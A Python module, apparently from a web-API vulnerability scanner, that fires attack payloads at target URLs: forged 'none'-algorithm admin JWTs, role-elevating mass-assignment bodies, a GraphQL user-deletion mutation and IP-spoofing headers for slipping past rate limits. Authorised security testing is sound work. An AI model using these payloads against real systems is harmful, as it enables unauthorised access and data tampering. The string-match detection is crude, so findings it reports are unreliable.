#!/usr/bin/env python3
"""
Advanced API Security Testing Module
Tests for modern API vulnerabilities including:
- GraphQL injection and introspection
- REST API security misconfigurations
- JWT token vulnerabilities
- API rate limiting bypass
- BOLA/IDOR in APIs
- API versioning attacks
- Mass assignment vulnerabilities
"""

import requests
import re
import json
import jwt
import base64
import time
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style
import hashlib
import urllib.parse

class APISecurityTester:
    def __init__(self, timeout=10, level='normal'):
        self.timeout = timeout
        self.level = level
        self.vulnerabilities = []
        
        # API vulnerability patterns
        self.api_vulnerabilities = {
            # GraphQL vulnerabilities
            'graphql': {
                'endpoints': [
                    '/graphql', '/graphiql', '/api/graphql', '/v1/graphql',
                    '/query', '/api/query', '/gql', '/graph'
                ],
                'payloads': [
                    # Introspection queries
                    '{"query": "query IntrospectionQuery { __schema { queryType { name } } }"}',
                    '{"query": "{ __schema { types { name } } }"}',
                    
                    # Injection attempts
                    '{"query": "query { users { id name password } }"}',
                    '{"query": "mutation { deleteUser(id: \\"1\\") { success } }"}',
                    
                    # Depth-based DoS
                    '{"query": "{ user { posts { comments { replies { content } } } } }"}',
                    
                    # Field duplication attack
                    '{"query": "{ user { id id id id id } }"}',
                ]
            },
            
            # JWT vulnerabilities
            'jwt': {
                'endpoints': [
                    '/auth', '/login', '/token', '/api/auth', '/oauth',
                    '/refresh', '/verify', '/api/token'
                ],
                'payloads': [
                    # Algorithm confusion
                    'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.',
                    
                    # HS256 to RS256 confusion
                    'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.signature',
                    
                    # Weak secret
                    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ',
                    
                    # Kid header manipulation
                    '{"alg":"HS256","typ":"JWT","kid":"../../../dev/null"}',
                ]
            },
            
            # API mass assignment
            'mass_assignment': {
                'endpoints': [
                    '/api/users', '/api/profile', '/api/account', '/users',
                    '/profile', '/account', '/api/update'
                ],
                'payloads': [
                    # Role elevation
                    '{"username": "user", "password": "pass", "role": "admin", "is_admin": true}',
                    '{"id": 1, "name": "user", "admin": true, "privileges": ["all"]}',
                    
                    # Hidden fields manipulation
                    '{"email": "test@test.com", "verified": true, "premium": true}',
                    '{"user_id": 1, "balance": 99999, "credits": 99999}',
                ]
            },
            
            # API rate limiting bypass
            'rate_limiting': {
                'endpoints': [
                    '/api/login', '/api/register', '/api/reset', '/api/verify',
                    '/login', '/register', '/forgot-password'
                ],
                'payloads': [
                    # Header manipulation for bypass
                    '{"headers": {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "192.168.1.1"}}',
                    '{"headers": {"X-Originating-IP": "10.0.0.1", "X-Remote-IP": "172.16.0.1"}}',
                    
                    # Case sensitivity bypass
                    '{"method_variation": "POST vs post vs Post"}',
                    
                    # URL encoding bypass
                    '{"url_encoded": "%2Fapi%2Flogin", "double_encoded": "%252Fapi%252Flogin"}',
                ]
            },
            
            # API versioning attacks
            'api_versioning': {
                'endpoints': [
                    '/v1/users', '/v2/users', '/api/v1', '/api/v2',
                    '/api/v0.1', '/api/beta', '/api/internal'
                ],
                'payloads': [
                    # Version manipulation
                    '{"version_downgrade": "v1", "bypass_security": true}',
                    '{"api_version": "internal", "debug": true}',
                    
                    # Legacy endpoint exploitation
                    '{"legacy_access": true, "old_permissions": "admin"}',
                ]
            }
        }
        
        # API vulnerability indicators
        self.vulnerability_indicators = {
            'graphql_exposed': [
                '__schema', '__type', 'introspection', 'GraphiQL',
                'query', 'mutation', 'subscription', 'graphql playground'
            ],
            'jwt_vulnerable': [
                'algorithm none', 'weak secret', 'signature verification',
                'token manipulation', 'kid injection', 'jwt decode error'
            ],
            'mass_assignment': [
                'role updated', 'admin access granted', 'privilege escalation',
                'hidden field updated', 'unauthorized modification'
            ],
            'rate_limit_bypass': [
                'rate limit exceeded', 'too many requests', 'bypass successful',
                'header manipulation', 'ip whitelisted'
            ],
            'api_version_exploit': [
                'version mismatch', 'legacy access', 'internal api exposed',
                'debug mode enabled', 'admin endpoints'
            ]
        }
    
    def test_graphql_vulnerabilities(self, url):
        """Test for GraphQL security vulnerabilities"""
        results = []
        
        graphql_config = self.api_vulnerabilities['graphql']
        
        for endpoint in graphql_config['endpoints']:
            test_url = f"{url.rstrip('/')}{endpoint}"
            
            for payload in graphql_config['payloads']:
                try:
                    headers = {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json',
                        'User-Agent': 'APISecurityTester/1.0'
                    }
                    
                    response = requests.post(test_url, data=payload, headers=headers,
                                           timeout=self.timeout, verify=False)
                    
                    # Check for GraphQL exposure indicators
                    for indicator in self.vulnerability_indicators['graphql_exposed']:
                        if indicator.lower() in response.text.lower():
                            vuln = {
                                'type': 'GraphQL Security Vulnerability',
                                'severity': 'High' if 'introspection' in indicator else 'Medium',
                                'url': test_url,
                                'method': 'POST',
                                'payload': payload,
                                'evidence': f"GraphQL vulnerability indicator: {indicator}",
                                'attack_vector': 'GraphQL introspection or injection',
                                'impact': 'Schema exposure, data extraction, DoS attacks',
                                'remediation': 'Disable introspection in production, implement query depth limiting',
                                'status_code': response.status_code
                            }
                            results.append(vuln)
                            print(f"{Fore.YELLOW}[!] GraphQL vulnerability: {test_url} - {indicator}{Style.RESET_ALL}")
                            break
                
                except Exception:
                    continue
        
        return results
    
    def test_jwt_vulnerabilities(self, url):
        """Test for JWT token vulnerabilities"""
        results = []
        
        jwt_config = self.api_vulnerabilities['jwt']
        
        for endpoint in jwt_config['endpoints']:
            test_url = f"{url.rstrip('/')}{endpoint}"
            
            for payload in jwt_config['payloads']:
                try:
                    headers = {
                        'Authorization': f'Bearer {payload}',
                        'Content-Type': 'application/json',
                        'User-Agent': 'APISecurityTester/1.0'
                    }
                    
                    response = requests.get(test_url, headers=headers,
                                          timeout=self.timeout, verify=False)
                    
                    # Check for JWT vulnerability indicators
                    for indicator in self.vulnerability_indicators['jwt_vulnerable']:
                        if indicator.lower() in response.text.lower():
                            vuln = {
                                'type': 'JWT Security Vulnerability',
                                'severity': 'Critical',
                                'url': test_url,
                                'method': 'GET',
                                'payload': payload,
                                'evidence': f"JWT vulnerability indicator: {indicator}",
                                'attack_vector': 'JWT algorithm confusion or weak secrets',
                                'impact': 'Authentication bypass, privilege escalation',
                                'remediation': 'Use strong secrets, validate algorithm, implement proper verification',
                                'status_code': response.status_code
                            }
                            results.append(vuln)
                            print(f"{Fore.RED}[!] CRITICAL: JWT vulnerability: {test_url} - {indicator}{Style.RESET_ALL}")
                            break
                    
                    # Check for algorithm none acceptance
                    if 'alg":"none"' in payload and response.status_code == 200:
                        vuln = {
                            'type': 'JWT Algorithm None Vulnerability',
                            'severity': 'Critical',
                            'url': test_url,
                            'method': 'GET',
                            'payload': payload,
                            'evidence': 'Server accepts JWT tokens with "none" algorithm',
                            'attack_vector': 'JWT algorithm confusion attack',
                            'impact': 'Complete authentication bypass',
                            'status_code': response.status_code
                        }
                        results.append(vuln)
                        print(f"{Fore.RED}[!] CRITICAL: JWT 'none' algorithm accepted: {test_url}{Style.RESET_ALL}")
                
                except Exception:
                    continue
        
        return results
    
    def test_mass_assignment_vulnerabilities(self, url):
        """Test for mass assignment vulnerabilities"""
        results = []
        
        mass_config = self.api_vulnerabilities['mass_assignment']
        
        for endpoint in mass_config['endpoints']:
            test_url = f"{url.rstrip('/')}{endpoint}"
            
            for payload in mass_config['payloads']:
                try:
                    response = requests.post(test_url, json=json.loads(payload) if payload.startswith('{') else {'data': payload},
                                           timeout=self.timeout, verify=False)
                    
                    # Check for mass assignment indicators
                    for indicator in self.vulnerability_indicators['mass_assignment']:
                        if indicator.lower() in response.text.lower():
                            vuln = {
                                'type': 'Mass Assignment Vulnerability',
                                'severity': 'High',
                                'url': test_url,
                                'method': 'POST',
                                'payload': payload,
                                'evidence': f"Mass assignment indicator: {indicator}",
                                'attack_vector': 'Unfiltered parameter binding',
                                'impact': 'Privilege escalation, data modification',
                                'remediation': 'Implement strong parameter filtering and whitelisting',
                                'status_code': response.status_code
                            }
                            results.append(vuln)
                            print(f"{Fore.YELLOW}[!] Mass assignment vulnerability: {test_url} - {indicator}{Style.RESET_ALL}")
                            break
                
                except Exception:
                    continue
        
        return results
    
    def test_rate_limiting_bypass(self, url):
        """Test for rate limiting bypass vulnerabilities"""
        results = []
        
        rate_config = self.api_vulnerabilities['rate_limiting']
        
        for endpoint in rate_config['endpoints']:
            test_url = f"{url.rstrip('/')}{endpoint}"
            
            # Test multiple rapid requests first
            try:
                rapid_requests = []
                for i in range(10):
                    response = requests.post(test_url, json={'test': 'rate_limit'},
                                           timeout=self.timeout, verify=False)
                    rapid_requests.append(response.status_code)
                    time.sleep(0.1)
                
                # If no rate limiting detected, test bypass techniques
                if all(code != 429 for code in rapid_requests):
                    for payload in rate_config['payloads']:
                        try:
                            if 'headers' in payload:
                                headers_data = json.loads(payload).get('headers', {})
                                response = requests.post(test_url, json={'bypass': 'test'}, 
                                                       headers=headers_data, timeout=self.timeout, verify=False)
                                
                                if response.status_code == 200:
                                    vuln = {
                                        'type': 'Rate Limiting Bypass',
                                        'severity': 'Medium',
                                        'url': test_url,
                                        'method': 'POST',
                                        'payload': payload,
                                        'evidence': 'Rate limiting bypassed with header manipulation',
                                        'attack_vector': 'IP spoofing headers',
                                        'impact': 'Brute force attacks, resource exhaustion',
                                        'status_code': response.status_code
                                    }
                                    results.append(vuln)
                                    print(f"{Fore.CYAN}[!] Rate limiting bypass: {test_url}{Style.RESET_ALL}")
                        except Exception:
                            continue
            except Exception:
                continue
        
        return results
    
    def test_api_versioning_vulnerabilities(self, url):
        """Test for API versioning attack vulnerabilities"""
        results = []
        
        version_config = self.api_vulnerabilities['api_versioning']
        
        for endpoint in version_config['endpoints']:
            test_url = f"{url.rstrip('/')}{endpoint}"
            
            try:
                response = requests.get(test_url, timeout=self.timeout, verify=False)
                
                # Check for version exposure indicators
                for indicator in self.vulnerability_indicators['api_version_exploit']:
                    if indicator.lower() in response.text.lower():
                        vuln = {
                            'type': 'API Version Exposure',
                            'severity': 'Medium',
                            'url': test_url,
                            'method': 'GET',
                            'evidence': f"API version vulnerability: {indicator}",
                            'attack_vector': 'API version enumeration and exploitation',
                            'impact': 'Access to legacy endpoints, debug information exposure',
                            'remediation': 'Properly version APIs, remove debug endpoints in production',
                            'status_code': response.status_code
                        }
                        results.append(vuln)
                        print(f"{Fore.CYAN}[!] API version vulnerability: {test_url} - {indicator}{Style.RESET_ALL}")
                        break
                        
            except Exception:
                continue
        
        return results
    
    def test_api_security_vulnerabilities(self, targets):
        """Main function to test API security vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Starting API security testing...{Style.RESET_ALL}")
        
        all_vulnerabilities = []
        
        # Handle different target formats
        if isinstance(targets, str):
            targets = [{'url': targets, 'subdomain': targets}]
        elif not isinstance(targets, list):
            targets = [targets]
        
        for target in targets:
            if isinstance(target, str):
                url = target
            else:
                url = target.get('url', target.get('subdomain', ''))
            
            if not url.startswith('http'):
                url = f"http://{url}"
            
            print(f"{Fore.CYAN}[*] Testing API security: {url}{Style.RESET_ALL}")
            
            # Test GraphQL vulnerabilities
            graphql_vulns = self.test_graphql_vulnerabilities(url)
            all_vulnerabilities.extend(graphql_vulns)
            
            # Test JWT vulnerabilities
            jwt_vulns = self.test_jwt_vulnerabilities(url)
            all_vulnerabilities.extend(jwt_vulns)
            
            # Advanced tests for moderate/extreme levels
            if self.level in ['moderate', 'extreme']:
                # Test mass assignment vulnerabilities
                mass_vulns = self.test_mass_assignment_vulnerabilities(url)
                all_vulnerabilities.extend(mass_vulns)
                
                # Test rate limiting bypass
                rate_vulns = self.test_rate_limiting_bypass(url)
                all_vulnerabilities.extend(rate_vulns)
                
                # Test API versioning vulnerabilities
                version_vulns = self.test_api_versioning_vulnerabilities(url)
                all_vulnerabilities.extend(version_vulns)
        
        self.vulnerabilities = all_vulnerabilities
        return all_vulnerabilities